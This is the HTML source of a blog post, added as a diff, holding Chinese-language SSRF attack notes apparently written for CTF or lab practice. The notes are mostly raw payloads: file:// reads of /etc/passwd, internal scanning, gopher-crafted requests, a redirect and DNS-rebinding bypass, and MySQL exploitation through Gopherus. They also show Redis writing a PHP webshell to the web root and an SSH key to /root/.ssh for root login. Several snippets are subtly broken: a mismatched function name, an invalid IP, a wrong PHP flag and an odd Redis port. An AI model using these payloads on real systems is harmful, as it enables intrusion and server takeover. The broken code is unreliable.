@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="敏感文件访问 12345678# Linux 用户密码文件file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd# 查看主机所在IPfile:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts# arp缓存 扫描内网查看file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;arp# 路由表file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;fib_trie  扫描内网资产 12345# 扫描内网网段 查看arp缓存 有MAC地址的IP确定资产 也可以进行目录扫描http:&#x2F;&#x2F;1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF">
+<meta property="og:url" content="http://example.com/2025/02/24/SSRF/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="敏感文件访问 12345678# Linux 用户密码文件file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd# 查看主机所在IPfile:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts# arp缓存 扫描内网查看file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;arp# 路由表file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;fib_trie  扫描内网资产 12345# 扫描内网网段 查看arp缓存 有MAC地址的IP确定资产 也可以进行目录扫描http:&#x2F;&#x2F;1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/Image/SQL%E6%B3%A8%E5%85%A5/Pasted%20image%2020250224163831.png">
+<meta property="og:image" content="http://example.com/Image/SQL%E6%B3%A8%E5%85%A5/Pasted%20image%2020250224171418.png">
+<meta property="article:published_time" content="2025-02-24T10:11:08.000Z">
+<meta property="article:modified_time" content="2025-05-03T03:48:24.983Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="OWASP TOP10">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/Image/SQL%E6%B3%A8%E5%85%A5/Pasted%20image%2020250224163831.png">
+
+<link rel="canonical" href="http://example.com/2025/02/24/SSRF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>SSRF | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/24/SSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SSRF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2025-02-24 18:11:08" itemprop="dateCreated datePublished" datetime="2025-02-24T18:11:08+08:00">2025-02-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2025-05-03 11:48:24" itemprop="dateModified" datetime="2025-05-03T11:48:24+08:00">2025-05-03</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>敏感文件访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Linux 用户密码文件</span><br><span class="line">file:///etc/passwd</span><br><span class="line"># 查看主机所在IP</span><br><span class="line">file:///etc/hosts</span><br><span class="line"># arp缓存 扫描内网查看</span><br><span class="line">file:///proc/net/arp</span><br><span class="line"># 路由表</span><br><span class="line">file:///proc/net/fib_trie</span><br></pre></td></tr></table></figure>
+
+<p>扫描内网资产</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 扫描内网网段 查看arp缓存 有MAC地址的IP确定资产 也可以进行目录扫描</span><br><span class="line">http://172.72.23.23</span><br><span class="line"></span><br><span class="line"># 确定完IP之后 进行端口扫描</span><br><span class="line">dict://172.72.23.23:8080</span><br></pre></td></tr></table></figure>
+
+<p>Gopher协议</p>
+<p>可以使用gopher发起get或post请求（默认70端口）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher://host:port/gopher-path</span><br></pre></td></tr></table></figure>
+
+<p>gopher请求不转发第一个字符</p>
+<p><code>curl gopher://127.0.0.0.1:8080/abcd</code> -&gt; <code>bcd</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># GET 需要传递路径 和 主机地址 不可见字符使用URL编码</span><br><span class="line">gopher://172.72.23.22:80/_GET%20/index.php%3fname=benben%20HTTP/1.1%0d%0AHost:%20172.72.23.22%0d%0A</span><br><span class="line"></span><br><span class="line"># POST 需要传递路径 和 主机地址 Content-Type 和 Content-Length</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>127.0.0.1 绕过 IP限制转八进制、二进制、十六进制、十进制</p>
+<p>绕过302重定向 </p>
+<p>在远程服务中编写一个跳转到内网IP的PHP代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:http://127.0.0.1/flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>开启一个php http服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -s 0.0.0.0:7777</span><br></pre></td></tr></table></figure>
+
+<p>DNS重绑定绕过</p>
+<p><img src="/Image/SQL%E6%B3%A8%E5%85%A5/Pasted%20image%2020250224163831.png"><br>利用网站 <a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us dns rebinding service</a></p>
+<p>文件上传<br><img src="/Image/SQL%E6%B3%A8%E5%85%A5/Pasted%20image%2020250224171418.png"><br>Mysql 未授权利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i lo port 3306 -w mysql.pcapng</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h127.0.0.1 -uroot --ssl-mode=DISABLED -e &quot;show database;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>拿到原始数据之后 去掉换行符 转为URL编码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">results</span>(<span class="params">s</span>):</span><br><span class="line">	a=[s[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">2</span>)]</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;gopher://IP:PORT/_%&quot;</span> + <span class="string">&quot;%&quot;</span>.join(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	s=sys.argv[<span class="number">1</span>]</span><br><span class="line">	<span class="built_in">print</span>(result(s))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>SQL NOLSQL利用生成工具：<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">GitHub - tarunkant&#x2F;Gopherus</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2.7 .\gopherus.py --exploit mysql</span><br></pre></td></tr></table></figure>
+
+
+<p>redis 未授权写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 设置web路径</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line"></span><br><span class="line"># 设置shell文件名</span><br><span class="line">config set dbfilename phpinfo.php</span><br><span class="line"></span><br><span class="line"># 设置php 数据载荷</span><br><span class="line">set payload &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line"></span><br><span class="line"># 保存webshell</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line"># 退出</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+
+<p>tcpdump抓取 换行符替换为<code>%0d%0A</code>   <code>?</code> 替换为URL编码 构造数据载荷</p>
+<p>redis 写入公钥(root)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 创建密钥 id_rsa id_rsa.pub</span><br><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 设置web路径</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line"></span><br><span class="line"># 设置shell文件名</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line"></span><br><span class="line"># 设置php 数据载荷</span><br><span class="line">set payload &quot;id_rsa.pub的内容&quot;</span><br><span class="line"></span><br><span class="line"># 保存webshell</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line"># 退出</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+
+<p>tcpdump抓取 换行符替换为<code>%0d%0A</code>  构造数据载荷</p>
+<p>将数据载荷进行两次URL编码拼接到<code>gopher://redisIP:6389/_</code>后边</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa -p PORT root@IP</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/OWASP-TOP10/" rel="tag"># OWASP TOP10</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2025/04/16/SQL%20Injection/" rel="next" title="SQL注入">
+      SQL注入 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
